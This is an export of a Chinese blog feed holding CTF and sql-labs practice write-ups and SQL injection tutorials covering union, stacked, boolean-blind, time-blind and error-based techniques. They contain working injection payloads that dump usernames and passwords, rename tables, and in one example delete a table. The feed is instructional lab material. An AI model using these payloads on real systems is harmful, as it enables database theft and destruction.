        <content type="html"><![CDATA[<h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p>mysql数据库sql语句的默认结尾是以 <strong>;</strong> 结尾，在执行多条sql语句时要使用结束符隔开，那么在 <strong>；</strong>结束一条sql语句后继续构造下一条语句会不会一起执行？因此这个想法就造成了堆叠注入。</p><p>而union injection(联合注入)也是将两条语句合并在一起，两者有什么区别嘛？</p><p>区别就在于union或者union all 执行的语句类型有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><pre><code>用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</code></pre><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>1.先判断注入类型</p><pre><code>1</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202114862.png" alt="image-20230516202114862"></p><p>正常显示，再试试别的</p><pre><code>1&#39;</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202210837.png" alt="image-20230516202210837"></p><p>出现错误，说明存在注入，看一下报错信息，没有显示有用的信息，在试试万能注入</p><pre><code>1&#39; or 1=1;#</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202509807.png" alt="image-20230516202509807"></p><p>2.可以判断一下字段数</p><pre><code>1&#39; order by 3#    </code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516203725859.png" alt="image-20230516203725859"></p><pre><code>1&#39; order by 2#</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516204018371.png" alt="image-20230516204018371"></p><p>说明字段数为2</p><p>然后我们尝试一下用联合注入看一下</p><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516204230761.png" alt="image-20230516204230761"></p><p>perg_math函数是正则函数，从报错信息我们发现select被正则匹配过滤掉了</p><p>我们再试试别的方法</p><p>3.查看数据库</p><pre><code>1&#39;;show databases;#</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516205244193.png" alt="image-20230516205244193"></p><p>执行上面的语句，我们发现第一句满足条件的语句之后，还能在执行下一条，没有条件限制</p><p>4.查看表名</p><pre><code>1&#39;;show tables from supersqli;#</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516210127648.png" alt="image-20230516210127648"></p><p><strong>注意：如果查看的表名是字符串，就需要加上反引号(`),英文输入法下按esc下面那个键</strong></p><p>查看字符串表中的数据</p><pre><code>1&#39;;use supersqli;show columns from `1919810931114514`;#</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516210857498.png" alt="image-20230516210857498"></p><p>再查看words表看看</p><pre><code>1&#39;;use supersqli;show columns from words;#</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516211257044.png" alt="image-20230516211257044"></p><p>varchar()是一种比char灵活的数据类型，是可以保存可变长的字符串</p><p>根据两个表的情况结合实际查询出结果,判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构也是id（数字）和data（字符串），查询传入参数也就是赋值给了id</p><h2 id="rename和alert用法"><a href="#rename和alert用法" class="headerlink" title="rename和alert用法"></a>rename和alert用法</h2><p>rename：修改一个或者多个表的名称</p><pre><code>rename table old_table_name to new_table_name;</code></pre><p>alter :向表中添加字段</p><pre><code>alter table [表名] add [列名] 类型</code></pre><p>保留old和new列名</p><pre><code>列名：a ----&gt;b 列类型     alter table t1 change a b integer;</code></pre><p>改名</p><pre><code>1&#39;;rename table `words` to words2;rename table `1919810931114514` to words;alter table words change flag id varchar(100);show tables;#</code></pre><p>更改表名列名</p><p>1，通过 rename 先把 words 表改名为其他的表名。</p><p>2，把 1919810931114514 表的名字改为 words 。</p><p>3 ，给新 words 表添加新的列名 id 。</p><p>4，将 flag 改名为 data 。</p><p><code>show tables</code>主要看看改成功没有，这里改表名要有顺序，如果先改数字表，那就出现两个words表，导致语句不能执行，所以需要先改words表名为其他名字，然后修改数字表为words；避免因为名字而发生命令冲突</p><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516214010853.png" alt="image-20230516214010853"></p><p>最后用</p><pre><code>1&#39; and 1=1#</code></pre><p>看回显数据</p><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516214204616.png" alt="image-20230516214204616"></p><p>得到flag</p><p>这个大佬的wp不错！！！</p><p><a href="https://ttoc.fun/2022/06/21/buuctf-wp/">https://ttoc.fun/2022/06/21/buuctf-wp/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs靶场less8(盲注)</title>
      <link href="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/"/>
      <url>/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/</url>
      
        <content type="html"><![CDATA[<p>bool盲注常用的函数</p><pre><code>database()   显示数据库名称left(a,b)    从左侧截取a的前b位substr(a,b,c) 从b位置开始，截取字符串a到c的长度mid(a,b,c)  从b位置开始，截取a字符串的c位length()    返回字符串长度ascii()      将某个字符转换成ascii值char()       将ascii码转换为对应的字符</code></pre><p>打开源码看了一下</p><p>这道题可以使用时间盲注，不能使用报错注入，因为报错的信息被注释掉了</p><p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515103641066.png" alt="image-20230515103641066"></p><p>1.判断注入点</p><pre><code>?id=1   页面正常，但是没有显示消息</code></pre><p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515105031032.png" alt="image-20230515105031032"></p><p>加单引号</p><p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515105151868.png" alt="image-20230515105151868"></p><p>页面无回显，应该是报错了</p><p>继续试试</p><pre><code>?id=1 and 1=1?id=1 and 1=2 页面都正常，说明不是数字型注入，?id=1&#39; and 1=1 --+  页面正常，可以正常的显示    真      真    真?id=1&#39; and 1=2 --+   真       假    假页面发生变化(没有报错，只是查不出来数据，和上面的无回显不一样)，说明是单引号闭合的字符型注入。</code></pre><p>1.查看数据库版本</p><pre><code>?id=1&#39; and left(version(),1)=5 %23</code></pre><p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515112258415.png" alt="image-20230515112258415"></p><p>这个数据库的版本为5.7.42 ，上面的语句是看版本号的第一位是不是5，如果回显正常，那么说明第一位就是5</p><p>上图显示正常，剩下的慢慢测，一般使用脚本。</p><p>2.猜解数据库的长度</p><pre><code>?id=1&#39; and length(database(),1)&gt;&#39;a&#39; --+</code></pre><p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515114347238.png" alt="image-20230515114347238"></p><p>数据库长度为 8 时，页面回显正常。这里说明下，长度要一个一个的试，这里只是验证下，在要爆信息不多的情况下可以手动试试（二分法可以提高很多效率），太多的话就建议用脚本，或者用burp 爆破。</p><p>3.猜数据库名字</p><pre><code>?id=1&#39; and left(databse(),1)&gt;&#39;a&#39; --+</code></pre><p><code>left(a,b)</code>：返回a字符串从左至b位数，详细看下面用法</p><p>4.猜表名</p><pre><code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+</code></pre><p>5.猜字段名</p><pre><code>?id=1&#39; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit x,1),y)=&quot;&quot;--+</code></pre><p>6.猜数据</p><p>用户名</p><pre><code>?id=1&#39; and left((select username from users limit x,1),y)=&quot;&quot;--+</code></pre><p>通过变换x，y的值可以得到所有的用户名 。</p><p>密码</p><pre><code>?id=1&#39; and left((select password from users limit x,1),y)=&quot;&quot;--+</code></pre><p>通过变换 x，y 的值可以得到所有的密码 。</p><p>通过布尔盲注手工注入比较繁琐，可以用脚本。</p><p>下面分享脚本</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs靶场less7</title>
      <link href="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless7/"/>
      <url>/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless7/</url>
      
        <content type="html"><![CDATA[<p>打开题目</p><p>1.判断是否是数字型传参</p><p>2.判断是否有单引号闭合</p><p>3.判断是否有双引号闭合</p><p>4.判断是否单引号+括号闭合</p><p>5.判断是否是双引号+括号闭合</p><p>如果以上都不是，那以上规则都同时加上sleep测试一遍，看是不是存在延时注入</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>布尔盲注和时间盲注</title>
      <link href="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
      <url>/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是盲注"><a href="#什么是盲注" class="headerlink" title="什么是盲注"></a>什么是盲注</h2><p>盲注就是在sql注入过程中，sql语句执行select之后，可能由于网站方法代码的限制或者apache等解析器配置了不回显数据，造成在select数据之后不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个判断过程称为盲注。</p><p>简单理解就是在前端页面没有显示位，不能返回sql语句执行错误的信息，输入正确和错误返回的信息都是一致的，这个时候我们需要使用页面的正常和不正常显示来进行sql注入。</p><h2 id="盲注的分类"><a href="#盲注的分类" class="headerlink" title="盲注的分类"></a>盲注的分类</h2><p>布尔盲注</p><p>时间盲注</p><h2 id="利用盲注的前提条件"><a href="#利用盲注的前提条件" class="headerlink" title="利用盲注的前提条件"></a>利用盲注的前提条件</h2><p>首先页面没有显示位（如果有显示位可以选择union联合查询），并且没有返回sql语句的执行错误信息。</p><h2 id="盲注的优缺点"><a href="#盲注的优缺点" class="headerlink" title="盲注的优缺点"></a>盲注的优缺点</h2><p>优点：不需要显示位和出错信息。</p><p>缺点：速度慢，耗费时间长（可以使用bp等工具）</p><h2 id="布尔类型的盲注"><a href="#布尔类型的盲注" class="headerlink" title="布尔类型的盲注"></a>布尔类型的盲注</h2><ol><li>left(database(),1)&gt;’s’     //left() 函数</li></ol><p>database()显示数据库名称，left(a,b)从左侧截取a的前b位</p><ol start="2"><li> ascii(substr((select table_name information_schema.tables where tables_schema=database() limit 0,1 ),1,1))=101 –+          //substr()函数，ascii函数()</li></ol><p>   substr(a,b,c)从b位置开始，截取字符串a的c长度。ascii()将某个字符转换为ascii值</p><ol start="3"><li><p>ascii(substr((select database()),1,1))=98</p></li><li><p>ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&gt;98%23           //ord()函数，mid()函数</p><p>mid(a,b,c)从位置b开始，截取a字符串的c位</p><p>ord()函数同ascii(),将字符转为ascii值</p></li><li><p>regexp正则注入</p><p>用法介绍：select user() regexp ‘^[a-z]’;</p><p>正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。第二位可以用select user() regexp ‘^ro’ 来进行。</p><p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514160206799.png" alt="image-20230514160206799"></p></li></ol><p>当正确的时候显示结果为1，不正确的时候显示结果为0</p><p>6.like匹配注入</p><p>和上述的正则类似，mysql在匹配的时候我们可以用like 进行匹配。</p><p>用法：select user()  like ‘ro%’</p><p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514163811743.png" alt="image-20230514163811743"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5)%23)    //if判断语句，条件为假，条件为假，执行sleep</p><p>union select if(substring(current,1,1)=char(119),benchmark(5000000,encode(‘msg’,’by 5 seconds’)),null)  </p><p>from (select database() as current) as tbl;</p><p>//benchmark(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的CPU资源。</p><p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514173225035.png" alt="image-20230514173225035"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs靶场less6</title>
      <link href="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/"/>
      <url>/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/</url>
      
        <content type="html"><![CDATA[<p>1.判断注入点（双引号注入）</p><pre><code>?id=1&quot; and 1 --a   页面显示正常</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514203911904.png" alt="image-20230514203911904"></p><pre><code>?id=1&quot; and 0 -- a   页面异常（空显示）</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514205048775.png" alt="image-20230514205048775"></p><p>2.判断字符长度</p><p>判断当前使用的数据库长度是否大于1</p><pre><code>?id=1&quot; and length(database())=8 --+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514221524192.png" alt="image-20230514221524192"></p><p>3.穷举字符</p><p>判断当前使用的数据库第一个字符的ascll码是否大于1（肯定大于），地址栏输入</p><pre><code>?id=1&quot; and ascii(substr(database(),1,1)) &gt; 1 -- a</code></pre><pre><code>?id=1&quot; and left(database(),1)=&#39;s&#39; --+用穷举的方法一个个列出来，....效率有点慢了</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514222128909.png" alt="image-20230514222128909"></p><pre><code>?id=1&quot; and left(database(),8)=&#39;security&#39; --+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514225957158.png" alt="image-20230514225957158"></p><p>4.判断库中每个表名的长度</p><pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 6--+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514232750125.png" alt="image-20230514232750125"></p><p>第一个表的长度是6</p><pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1)) = 8--+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514232933832.png" alt="image-20230514232933832"></p><p>第二个表的长度为8</p><pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 2,1)) = 7--+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233146882.png" alt="image-20230514233146882"></p><p>第三个表的长度为7</p><pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 3,1)) = 5--+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233314642.png" alt="image-20230514233314642"></p><p>第四个表的长度为5</p><p>5.爆破表名</p><pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt; 100 --+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233558822.png" alt="image-20230514233558822"></p><pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233732069.png" alt="image-20230514233732069"></p><p>查看ascii表101是e，第一个表开头字母是e</p><p>…..此处省略一些步骤</p><pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1))=115 --+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514234142010.png" alt="image-20230514234142010"></p><p>查看ascii表115是u，第一个表开头字母是u</p><p>….表名是users</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs靶场less4</title>
      <link href="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/"/>
      <url>/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/</url>
      
        <content type="html"><![CDATA[<p>在复习一下less4</p><p>less-3是单引号+右括号，less-4是双引号+右括号</p><p>1.判断注入点</p><p>一开始，？id=1 直接回显用户名和密码，</p><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230513235842630.png" alt="image-20230513235842630"></p><p>在尝试一下别的符号</p><p>?id=1”  出现报错信息</p><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230514000027873.png" alt="image-20230514000027873"></p><p>错误提示是【”1””) LIMIT 0,1】，去掉自己输入的一个双引号后可以看出还有两个双引号和一个右括号，由此判可推出sql注入是由双引号和右括号和起来的闭合模式。</p><p>2.查字段名</p><p>输入</p><pre><code>？id=1&#39; and 1=2 --+</code></pre><p>后，提示超出列数，则尝试把4改成3，发现无报错，说明数据库查询语句查询列数为3列</p><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230514000300269.png" alt="image-20230514000300269"></p><p>3.查输出列的位置</p><pre><code>xxxxxxxxxx ?id=-1&quot;) union select 1,2,3 --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230514000817750.png" alt="image-20230514000817750"></p><p>4.查看当前数据库和版本</p><pre><code>?id=-1&quot;) union select 1,database(),version() --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230514001038494.png" alt="image-20230514001038494"></p><p>5.查看当前数据库下的表</p><pre><code>?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230514001411510.png" alt="image-20230514001411510"></p><p>6.查看user表下面的字段信息</p><pre><code>？id=-1&#39; union select 1,2,3 --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230514001554807.png" alt="image-20230514001554807"></p><p>7.查看字段数据</p><pre><code>?id=-1&quot;) union select 1,group_concat(username,0x2a,password),3 from users --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230514001730590.png" alt="image-20230514001730590"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs靶场less4</title>
      <link href="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/"/>
      <url>/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/</url>
      
        <content type="html"><![CDATA[<p>在复习一下less4</p><p>less-3是单引号+右括号，less-4是双引号+右括号</p><p>1.判断注入点</p><p>一开始，？id=1 直接回显用户名和密码，</p><p>​              ？id=1’ 也是直接回显用户名和密码</p><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230513235842630.png" alt="image-20230513235842630"></p><p>在尝试一下别的符号</p><p>?id=1”  出现报错信息</p><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514000027873.png" alt="image-20230514000027873"></p><p>错误提示是【”1””) LIMIT 0,1】，去掉自己输入的一个双引号后可以看出还有两个双引号和一个右括号，由此判可推出sql注入是由双引号和右括号和起来的闭合模式。</p><p>2.查字段名</p><p>输入</p><pre><code>?id=1&quot;) order by 4 --+</code></pre><p>后，提示超出列数，则尝试把4改成3，发现无报错，说明数据库查询语句查询列数为3列</p><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514000300269.png" alt="image-20230514000300269"></p><p>3.查输出列的位置</p><pre><code>?id=-1&quot;) union select 1,2,3 --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514000817750.png" alt="image-20230514000817750"></p><p>4.查看当前数据库和版本</p><pre><code>?id=-1&quot;) union select 1,database(),version() --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514001038494.png" alt="image-20230514001038494"></p><p>5.查看当前数据库下的表</p><pre><code>?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514001411510.png" alt="image-20230514001411510"></p><p>6.查看user表下面的字段信息</p><pre><code>?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514001554807.png" alt="image-20230514001554807"></p><p>7.查看字段数据</p><pre><code>?id=-1&quot;) union select 1,group_concat(username,0x2a,password),3 from users --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514001730590.png" alt="image-20230514001730590"></p><p>完成！！！！！！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs靶场less3</title>
      <link href="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/"/>
      <url>/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/</url>
      
        <content type="html"><![CDATA[<p>今天浅浅复习一下</p><p>1.判断注入点，</p><p>输入？id=1 显示正常 </p><p>​     ？id=1’ 不正常  说明存在注入</p><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513221043279.png" alt="image-20230513221043279"></p><p>上图显示）附近有语法错误，所以构造语句的时候需要用）进行闭合</p><pre><code>?id=1&#39;) union select 1 --+</code></pre><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513224322394.png" alt="image-20230513224322394"></p><p>上面图片显示列数不正确，盲猜试试三列</p><p>2.判断字段数</p><pre><code>?id=1&#39;) union select 1,2,3 --+</code></pre><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513224510771.png" alt="image-20230513224510771"></p><p>字段数为4时报错，说明字段数为3</p><p>3.判断回显</p><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513224733973.png" alt="image-20230513224733973"></p><p>4.查看当前数据库和版本</p><pre><code>?id=-1&#39;) union select 1,database(),version() --+</code></pre><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513224934066.png" alt="image-20230513224934066"></p><p>5.查看数据库名称</p><pre><code>?id=-1&#39;) union select 1，group_concat(schema_name),3 from information_schema.schemata --+</code></pre><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513230621168.png" alt="image-20230513230621168"></p><p>6.查看security库里面的表名</p><pre><code>?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;</code></pre><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513231141345.png" alt="image-20230513231141345"></p><p>7.获取列名</p><pre><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513231403867.png" alt="image-20230513231403867"></p><p>8.字段数据</p><p>获取到字段后，根据字段获取表里的数据。字段名之间再加上*字符的十六进制，可以把账号密码隔开，容易区分</p><pre><code>?id=-1&#39;) union select 1,group_concat(username,0x2a,password),3 from users --+</code></pre><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513231622174.png" alt="image-20230513231622174"></p><p>完成！！！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs靶场less2</title>
      <link href="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/"/>
      <url>/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/</url>
      
        <content type="html"><![CDATA[<p>练习回顾靶场less2</p><p>tips：可以打开每一关的源码，在该位置添加一句代码方便做题分析，</p><pre><code>echo&quot;sql里面执行的是&quot;.$sql.&quot;&lt;br&gt;&quot;;</code></pre><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230512225159607.png" alt="image-20230512225159607"></p><p>1.判断注入类型</p><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230512225353576.png" alt="image-20230512225353576"></p><p>可以知道是数值型</p><p>2.判断字段数</p><pre><code>?id=1 order by 4 不正常?id=1 order by 3 正常</code></pre><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230512225530782.png" alt="image-20230512225530782"></p><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230512225927074.png" alt="image-20230512225927074"></p><p>可以确定有三列</p><p>3.判断可以回显的字段数</p><pre><code>?id=-1 union select 1,2,3</code></pre><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513193541123.png" alt="image-20230513193541123"></p><p>4.判断数据库名和版本</p><pre><code>?id=-1 union select 1,database(),version()</code></pre><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513194524358.png" alt="image-20230513194524358"></p><p>5.获取表名</p><pre><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;</code></pre><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513195104430.png" alt="image-20230513195104430"></p><p>6.获取列名</p><pre><code>?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;</code></pre><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513195526249.png" alt="image-20230513195526249"></p><p>7.获取数据</p><pre><code>?id=-1 union select 1,username,password from security.users limit 0,1 --+</code></pre><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513195823876.png" alt="image-20230513195823876"></p><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513195921714.png" alt="image-20230513195921714"></p><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513200006154.png" alt="image-20230513200006154"></p><p>第n条…..依次类推limit n，1</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>报错注入</title>
      <link href="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="报错注入的定义"><a href="#报错注入的定义" class="headerlink" title="报错注入的定义"></a>报错注入的定义</h2><p>当网站的页面上没有显示位用于展示SQL语句执行后的结果，但是SQL语句执行可以输出错误信息，那么攻击者可以利用注入过程中返回的错误信息进行判断。</p><p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p><h2 id="常见的函数"><a href="#常见的函数" class="headerlink" title="常见的函数"></a>常见的函数</h2><p>1.extractvalue()</p><p>2.updataxml()</p><p>3.count() + rand() +floor() +group  by() 导致的主键重复</p><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>extractvalue (xml_document,xpath_string)</p><p>第一个参数是xml文档对象名称</p><p>第二个参数作用是从xml文档对象中返回查询到的字符串值，返回结果长度限制在32位字符。</p><pre><code>extractvalue(null,concat(0x7e,(sqli_inject),0x7e))注：利用extractvalue()对数据进行一个排序，指定一个参数为null，可以换成1、#或者其他符号，使其报错，并执行第二个参数语句。0x7e表示&quot;-&quot;号。</code></pre><h2 id="UpdateXml函数"><a href="#UpdateXml函数" class="headerlink" title="UpdateXml函数"></a>UpdateXml函数</h2><p>函数用法：</p><p>UPDATEXML(XML_document,XPath_string,new_value)</p><p>三个字符串参数：</p><p>1  .XML_Document是String格式，为XML文档对象的名称</p><p>2   .XPath_string(<a href="https://so.csdn.net/so/search?q=Xpath&spm=1001.2101.3001.7020">Xpath</a> 格式的字符串)</p><p>3    .new_value,string格式，替换查找到符合条件的数据</p><h3 id="为什么可以用于报错注入："><a href="#为什么可以用于报错注入：" class="headerlink" title="为什么可以用于报错注入："></a>为什么可以用于报错注入：</h3><p>UpdateXml 函数实际上是去更新了XML文档，但是我们在XML文档路径的位置里面写入了<a 